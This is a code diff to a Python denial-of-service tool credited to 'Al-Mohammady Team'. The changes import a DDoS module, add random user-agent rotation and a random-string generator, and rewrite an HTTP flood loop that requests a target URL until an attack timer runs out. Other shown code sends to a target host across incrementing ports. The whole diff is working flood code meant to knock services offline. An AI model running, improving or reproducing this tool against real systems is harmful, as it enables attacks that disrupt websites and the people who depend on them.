@@ -9,6 +9,8 @@ from queue import Queue
 import urllib.request
 import requests
 from halo import Halo
+from DDoS import userAgent
+
 # Colors
 Z1 = '\033[95m'  # بنفسجي
 Z = '\033[92m'  # Green
@@ -25,7 +27,7 @@ U = '\033[4m' #مسطر
 
 # -- Info -- #
 __author__ = 'Al-Mohammady Team'
-__version__ = '7.4'
+__version__ = '7.3'
 __status__ = "being developed ..."
 # —----——----—---——----
 
@@ -89,10 +91,11 @@ end_time = time.time() + attack_time
 
 def user_agent():
     global uagent
-
-    with open('user_agent.txt', 'r') as ua:
-        uagent = [line.strip() for line in ua.readlines()]
+    with open('user_agent.txt', 'r') as ug:
+        uagent = [line.strip() for line in ug.readlines()]
     return uagent
+    
+print(random.choice(user_agent()))
 
 def my_bots():
     global bots
@@ -101,23 +104,35 @@ def my_bots():
     return bots
 
 
+#
+def buildblock(size):
+        out_str = ''
+        for i in range(0, size):
+                a = random.randint(65, 90)
+                out_str += chr(a)
+        return(out_str)
+
+# ---—
+
 def httpcall(url):
     global successHttp
     successHttp = 0
-    try:
-        while time.time() < end_time:
-            successHttp += 1
 
+    while time.time() < end_time:
+        try:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
             print(f"\033[94m[ {req.getcode()} ] {L}HTTPCALL !\033[0m")
-
-            time.sleep(.0)
-    except urllib.error.HTTPError as e:
-        print(f'\033[94m[ {e.code} ] {L}Error Httpcall !')
-        time.sleep(.0)
-    else:
-        print(f'{B}[ % ] {L}HTTP Sent : {B}{successHttp}.')   
-
+            successHttp += 1
+            time.sleep(1)
+        except urllib.error.HTTPError as e:
+            print(f'\033[94m[ {e.code} ] {L}Error Httpcall ! \033[0m')
+            time.sleep(.1)
+        except Exception as e:
+            print(f'\033[94m[ ERROR ] {L}Unexpected error: {e} ... try again ... \033[0m')
+            time.sleep(.1)
+     
+    
+    print(f'{B}[ % ] {L}HTTP Sent : {B}{successHttp}.')
 # -- Down It -- #
 
 def down_it(item):
@@ -172,7 +187,7 @@ def dos3():
         sent = sent + 1
         port = port + 1
         try:
-            print(f'{Z}[{sent}] {F}Sent To {Z}[{host}] {F}through port {Z}[{port}]')
+            print(f'{Z}[ {sent} ] {F}Sent To {Z}[{host}] {F}through port {Z}[ {port} ]')
             sock.shutdown(1)
         except KeyboardInterrupt:
             sys.exit(0)
